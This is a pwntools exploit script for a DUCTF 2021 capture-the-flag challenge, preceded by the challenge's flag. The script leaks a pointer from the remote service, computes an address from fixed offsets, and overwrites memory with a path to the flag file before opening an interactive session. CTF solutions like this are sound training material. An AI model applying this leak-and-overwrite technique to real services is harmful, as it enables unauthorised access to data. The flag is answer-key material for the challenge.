#DUCTF{whats_in_a_name?_5aacfc58}
from pwn import *

target = remote("pwn-2021.duc.tf", 31907)

target.sendline("A"*0x20)

target.sendline("2")
target.recvuntil("A"*0x20)
leak = u64(target.recvline().strip().ljust(8, '\x00'))
log.info("Random stored at:" + hex(leak))

target.sendlineafter(">", "1")

bla = "/chal/flag.txt"
bla = bla.ljust(0x20, '\x00')
bla += p64(leak + 0x40a0 - 0x2024)
target.sendline(bla)

target.sendlineafter(">", "1337")
print("Checkpoint")
target.sendline(str(0x54435544))

target.interactive()